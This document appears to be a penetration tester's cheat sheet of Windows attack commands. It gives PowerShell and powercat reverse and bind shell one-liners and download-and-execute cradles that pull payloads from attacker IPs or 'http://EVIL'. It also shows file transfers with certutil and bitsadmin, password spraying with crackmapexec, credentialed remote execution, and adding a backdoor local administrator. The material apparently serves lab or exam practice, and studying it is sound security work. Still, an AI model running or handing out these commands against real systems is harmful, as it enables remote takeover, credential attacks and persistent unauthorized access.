#### Ping test blind rce
```sh
C:\Windows\System32\cmd.exe /c ping 10.10.14.27
# on linux box: 
tcpdump -i tun0 icmp
```


#### Ping test blind rce like above check if x64 powershell exists
```sh
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe ping 10.10.14.27
```

#### Download files
```bash
certutil.exe -urlcache -split -f http://10.10.14.10:8000/nc64.exe C:\\Users\\Public\\nc64.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/wget.exe','C:\Users\admin\Desktop\wget.exe')"

powershell iwr -uri http://10.10.16.97:8000/chisel.exe -outfile ch.exe # also works in PS ConstrainLanguageMode

expand http://10.10.14.10:8000/watson.exe C:\\Users\\Public\\watson.exe

bitsadmin /transfer debjob /download /priority normal http://10.10.14.10:8000/watson.exe C:\Users\\Public\watson.exe

```

#### md5checksum
```
certutil.exe -hashfile Taihou64.exe MD5
```

#### powershell native reverse shell
```sh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
1.1.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"

# or 

powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.119.147';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

```

#### PowerShell native bind shell
```sh
powershell -executionpolicy bypass -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',9001);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

#### Powercat basics

```bash

# send file
powercat -c 10.1.1.1 -p 443 -i C:\\Users\\admin\\file.txt # nc 10.1.1.1 443 < file.txt

# send reverse shell
powercat -c 10.1.1.1 -p 443 -e cmd.exe # nc 10.1.1.1 443 -e cmd.exe

# bind shell
powercat -l -p 443 -e cmd.exe # nc -l -p 443 -e cmd.exe

----
# generate encoded standalone reverse shell payload
powercat -c 10.1.1.1 -p 443 -e cmd.exe -ge > payload.ps1

# later execute it like
powershell.exe -E <PAYLOAD-HERE>
----

----
# generate encoded standalone bind shell payload
powercat -l -p 443 -e cmd.exe -ge > payload.ps1

# later execute it like
powershell.exe -E <PAYLOAD-HERE>
----

```


#### x64 PowerShell reverse shell using Invoke-PowerShellTcp.ps1
```sh
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10:8000/Invoke-PowerShellTcp.ps1')"
```

#### PowerShell 3.0+ fetch and exec:
```sh
IEX (iwr 'http://EVIL/evil.ps1')
```
#### PowerShell 2.0 reverse shell using Invoke-PowerShellTcp.ps1
```sh
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.119.147/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.147 -Port 443
```

#### Read a file and base64 encode its content
```sh
$fc = Get-Content "Oracle Issue.txt"
$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
[System.Convert]::ToBase64String($fe)
```

#### Check if powershell is running as 64-bit process
```sh
[Environment]::Is64BitProcess
```
#### Check if powershell is in constrainedlanguage mode 
```sh
$executioncontext.sessionstate.languagemode
```
#### Run netcat from samba share
```sh
\\10.10.14.10\myshare\nc64.exe "10.10.14.10 9001 -e cmd"
```

#### Check .NET Framework version
```sh
# cmd
dir /s msbuild \Windows\Microsoft.NET\Framework\
 

# Powershell
$psversiontable | findstr CLRVersion
```

#### List directory permissions (win server 2003)
```sh
icacls c:\*. /C
```


#### List alternate data stream files
```sh
dir /r
```

#### Mount windows account share using cifs, "ACCT here is account share name"
```bash
sudo mount -t cifs -o username=Finance //10.1.1.1/ACCT /mnt/win_share/
```

#### Mount vhd file from share
```bash
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector -ro -v /path/to/mount/directory
```


#### Encode ps1 and execute to avoid bad chars
```bash
# in linux
cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0
# in windows
powershell -enc [BASE64]
```


#### Executing privileged command using valid credentials from powershell
```sh
$username = "Username\Administrator"
$password = "SUPERSECRETPASS"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8000/shell.ps1') } -Credential $cred -Computer localhost

or - [BETTER]
$username = "Username\Administrator"
$password = ConvertTo-SecureString -AsPlainText -Force 'SUPERSECRETPASS'
$cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.97:8000/shell.ps1')" -Credential $cred

```


#### Logging into the privileged user account using valid credentials from powershell
```sh
$username = 'Username\Administrator'
$securePassword = ConvertTo-SecureString -AsPlainText -Force 'SUPERSECRETPASS'
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```


#### Dump password policy to prepare wordlist for password spray if smb null authentication allows domain enumeration.
```sh
crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
```
#### Check account lock policy before password spraying smb
```bash
crackmapexec smb 10.10.10.123 --pass-pol
```

#### Generate simple wordlist based around usernames for spraying  with hashcat
```bash
hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule users.txt > passwords.txt
```

#### Pass spray on smb with crackmapexec
```
crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt
```

#### Add new admin user
```sh
net user rayhan rh0x01@@@ /add
net localgroup administrators rayhan /add
```